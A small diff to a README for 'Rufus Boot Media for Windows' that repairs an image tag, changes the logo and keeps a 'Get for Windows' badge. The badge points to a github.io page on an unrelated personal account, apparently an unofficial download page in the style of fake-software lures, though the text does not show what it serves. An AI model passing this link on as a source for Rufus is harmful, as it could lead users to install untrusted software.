@@ -1,6 +1,7 @@
 # Rufus Boot Media for Windows
 
-<img "src=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmshOKGmfIG9cLu3XBinQUwGB8--uRvEtAqsnEkrUxyg&s=10"" alt="Rufus Logo" width="760">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYW6zQK3Rand26jsBerohC8uYSaI5wK1fYUBYxReaH59OSb8VxnLWlrLq_&s=10" width="900">
+
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/Rufus-Boot-Media)
 
